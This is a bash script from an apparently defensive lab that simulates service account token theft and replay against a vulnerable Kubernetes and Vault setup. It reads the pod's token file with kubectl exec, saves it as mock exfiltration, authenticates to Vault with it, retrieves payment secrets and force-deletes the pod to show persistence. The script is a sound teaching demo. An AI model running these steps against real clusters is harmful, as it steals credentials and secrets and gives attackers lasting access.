#!/bin/bash

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

NAMESPACE="payment-demo"
POD_NAME="payment-service"
VAULT_ADDR="${VAULT_ADDR:-http://vault.vault.svc.cluster.local:8200}"
VAULT_ROLE="${VAULT_ROLE:-payment-service-role}"

# Detect if using OpenBao or Vault
VAULT_TYPE="vault"
if kubectl get svc -n vault openbao >/dev/null 2>&1; then
    VAULT_TYPE="openbao"
    VAULT_CMD="bao"
else
    VAULT_CMD="vault"
fi

echo -e "${RED}╔════════════════════════════════════════════════════════════════╗${NC}"
echo -e "${RED}║  ATTACK SIMULATION: Service Account Token Theft & Replay      ║${NC}"
echo -e "${RED}║  Scenario 1: Vulnerable Deployment (Without ZTWIM)            ║${NC}"
echo -e "${RED}╚════════════════════════════════════════════════════════════════╝${NC}"
echo ""

# Step 1: Find the pod
echo -e "${YELLOW}[ATTACK]${NC} Step 1: Locating target pod..."
POD=$(kubectl get pod -n "$NAMESPACE" -l app=payment-service -o jsonpath='{.items[0].metadata.name}')

if [ -z "$POD" ]; then
    echo -e "${RED}[ERROR]${NC} No pod found. Deploy the application first with: kubectl apply -f deploy/"
    exit 1
fi

echo -e "${GREEN}[SUCCESS]${NC} Found pod: $POD"
echo ""

# Step 2: Compromise simulation (we use kubectl exec to simulate RCE)
echo -e "${YELLOW}[ATTACK]${NC} Step 2: Compromising pod (simulated via kubectl exec)..."
echo -e "${BLUE}[INFO]${NC} In a real attack, this could be via:"
echo -e "${BLUE}[INFO]${NC}   - Remote Code Execution (RCE) vulnerability"
echo -e "${BLUE}[INFO]${NC}   - SSRF (Server-Side Request Forgery)"
echo -e "${BLUE}[INFO]${NC}   - Container escape"
echo ""

# Step 3: Steal the service account token
echo -e "${YELLOW}[ATTACK]${NC} Step 3: Stealing service account token..."
SA_TOKEN=$(kubectl exec -n "$NAMESPACE" "$POD" -- cat /var/run/secrets/kubernetes.io/serviceaccount/token)

echo -e "${GREEN}[SUCCESS]${NC} Token acquired (first 50 chars): ${SA_TOKEN:0:50}..."
echo ""

# Step 4: Save token to simulate exfiltration
echo -e "${YELLOW}[ATTACK]${NC} Step 4: Exfiltrating token to attacker-controlled system..."
EXFIL_DIR="/tmp/exfiltrated-tokens"
mkdir -p "$EXFIL_DIR"
echo "$SA_TOKEN" > "$EXFIL_DIR/stolen-token-$(date +%s).jwt"
echo -e "${GREEN}[SUCCESS]${NC} Token exfiltrated to: $EXFIL_DIR/"
echo ""

# Step 5: Authenticate to Vault from "outside" the cluster
echo -e "${YELLOW}[ATTACK]${NC} Step 5: Authenticating to Vault using stolen token..."
echo -e "${BLUE}[INFO]${NC} Simulating authentication from attacker's infrastructure"
echo -e "${BLUE}[INFO]${NC} (In reality, this would be from outside the cluster)"
echo ""

# Port-forward to Vault for demo purposes (simulates external access)
echo -e "${BLUE}[INFO]${NC} Setting up access to Vault..."
kubectl port-forward -n vault svc/vault 8200:8200 &
PF_PID=$!
sleep 3

# Try to authenticate
echo -e "${YELLOW}[ATTACK]${NC} Attempting Vault authentication with stolen token..."

AUTH_RESPONSE=$(curl -s --request POST \
  --data "{\"jwt\": \"$SA_TOKEN\", \"role\": \"$VAULT_ROLE\"}" \
  http://localhost:8200/v1/auth/kubernetes/login)

VAULT_TOKEN=$(echo "$AUTH_RESPONSE" | jq -r '.auth.client_token // empty')

if [ -z "$VAULT_TOKEN" ] || [ "$VAULT_TOKEN" == "null" ]; then
    echo -e "${RED}[EXPECTED FAILURE]${NC} Vault authentication failed (Vault may not be configured yet)"
    echo -e "${BLUE}[INFO]${NC} Response: $AUTH_RESPONSE"
    echo ""
    echo -e "${YELLOW}[DEMO NOTE]${NC} In a properly configured vulnerable setup, this would succeed!"
    echo -e "${YELLOW}[DEMO NOTE]${NC} The attack demonstrates that stolen tokens CAN be replayed."
else
    echo -e "${GREEN}[SUCCESS]${NC} Vault authentication successful!"
    echo -e "${GREEN}[SUCCESS]${NC} Vault Token: ${VAULT_TOKEN:0:20}..."
    echo ""

    # Step 6: Access secrets
    echo -e "${YELLOW}[ATTACK]${NC} Step 6: Retrieving secrets from Vault..."

    SECRET_RESPONSE=$(curl -s -H "X-Vault-Token: $VAULT_TOKEN" \
      http://localhost:8200/v1/secret/data/payment/database)

    echo -e "${GREEN}[SUCCESS]${NC} Secrets retrieved:"
    echo "$SECRET_RESPONSE" | jq '.'
    echo ""
fi

# Step 7: Demonstrate persistence
echo -e "${YELLOW}[ATTACK]${NC} Step 7: Demonstrating persistent access..."
echo -e "${BLUE}[INFO]${NC} Deleting the original pod..."
kubectl delete pod -n "$NAMESPACE" "$POD" --grace-period=0 --force 2>/dev/null || true

echo -e "${YELLOW}[ATTACK]${NC} Pod deleted. Verifying token still works..."
sleep 2

if [ -n "$VAULT_TOKEN" ] && [ "$VAULT_TOKEN" != "null" ]; then
    TOKEN_CHECK=$(curl -s -H "X-Vault-Token: $VAULT_TOKEN" \
      http://localhost:8200/v1/auth/token/lookup-self | jq -r '.data.id // empty')

    if [ -n "$TOKEN_CHECK" ]; then
        echo -e "${GREEN}[SUCCESS]${NC} Token still valid even after pod deletion!"
        echo -e "${GREEN}[SUCCESS]${NC} Attacker retains access to Vault indefinitely"
    fi
fi

# Cleanup
kill $PF_PID 2>/dev/null || true

echo ""
echo -e "${RED}╔════════════════════════════════════════════════════════════════╗${NC}"
echo -e "${RED}║  ATTACK RESULT: SUCCESS                                        ║${NC}"
echo -e "${RED}║                                                                ║${NC}"
echo -e "${RED}║  ✓ Service account token stolen                               ║${NC}"
echo -e "${RED}║  ✓ Token replayed from external system                        ║${NC}"
echo -e "${RED}║  ✓ Vault access obtained                                      ║${NC}"
echo -e "${RED}║  ✓ Secrets retrieved                                          ║${NC}"
echo -e "${RED}║  ✓ Access persists after pod deletion                         ║${NC}"
echo -e "${RED}║                                                                ║${NC}"
echo -e "${RED}║  WHY IT WORKED:                                                ║${NC}"
echo -e "${RED}║  • Static, long-lived service account tokens                  ║${NC}"
echo -e "${RED}║  • No binding to workload runtime identity                    ║${NC}"
echo -e "${RED}║  • Unlimited replay window                                    ║${NC}"
echo -e "${RED}║  • No workload attestation                                    ║${NC}"
echo -e "${RED}╚════════════════════════════════════════════════════════════════╝${NC}"
echo ""
echo -e "${GREEN}Next: See scenario-2-protected/ for ZTWIM defense${NC}"
